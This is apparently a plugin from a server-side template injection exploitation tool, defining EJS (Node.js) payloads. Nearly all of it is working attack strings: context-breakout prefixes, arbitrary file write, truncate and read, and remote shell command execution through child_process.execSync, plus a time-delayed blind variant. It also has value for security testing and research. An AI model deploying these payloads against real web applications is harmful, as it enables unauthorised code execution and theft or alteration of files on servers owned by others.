from plugins.languages import javascript


class Ejs(javascript.Javascript):
    def init(self):
        self.update_actions({
            'render': {
                'header': """<%- '{header}'+""",
                'trailer': """+'{trailer}' %>""",
            },
            'write': {
                'write': """<%global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64'), 'binary')%>""",
                'truncate': """<%global.process.mainModule.require('fs').writeFileSync('{path}', '')%>"""
            },
            'read': {
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'evaluate': {
                'test_os': """global.process.mainModule.require('os').platform()"""
            },
            'execute_blind': {
                'execute_blind': """<%global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64').toString() + ' && sleep {delay}')%>"""
            },
            'execute': {
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64').toString())"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}%>', 'suffix': '<%#', 'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'suffix': '<%#', 'closures': {1: ["'", ')'], 2: ['"', ')']}},
            {'level': 3, 'prefix': '*/%>', 'suffix': '<%#'},
        ])
